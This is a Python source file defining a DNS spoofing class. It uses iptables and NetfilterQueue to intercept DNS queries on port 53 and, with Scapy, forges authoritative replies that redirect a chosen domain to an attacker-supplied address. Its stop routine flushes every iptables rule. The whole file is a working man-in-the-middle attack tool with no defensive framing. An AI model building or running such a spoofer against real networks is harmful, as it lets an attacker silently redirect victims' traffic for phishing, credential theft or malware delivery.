#! /usr/bin/env python3.6
"""Dns spoofing object."""

from netfilterqueue import NetfilterQueue
from scapy.all import DNS, IP, UDP, DNSRR, DNSQR
import os


class Dns:

    def __init__(self, site, new_site):
        self.site = str.encode(site)
        self.new_site = str.encode(new_site)
        self.queue = NetfilterQueue()

    def setup(self):
        os.system('iptables -t nat -A PREROUTING -p udp '
                  + '--dport 53 -j NFQUEUE --queue-num 1')

        def callback(packet):
            payload = packet.get_payload()
            pkt = IP(payload)
            if (pkt.haslayer(DNSQR)
                    and self.site in pkt[DNS].qd.qname):
                print("spoofing site")
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) /\
                    UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /\
                    DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                        an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10,
                                 rdata=self.new_site))
                packet.set_payload(bytes(spoofed_pkt))
            packet.accept()
        self.queue.bind(1, callback)

    def start(self):
        print("startig dns spoof")
        try:
            self.queue.run()
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        self.queue.unbind()
        os.system('iptables -F')
        os.system('iptables -X')
        print("dns spooffing stopped")
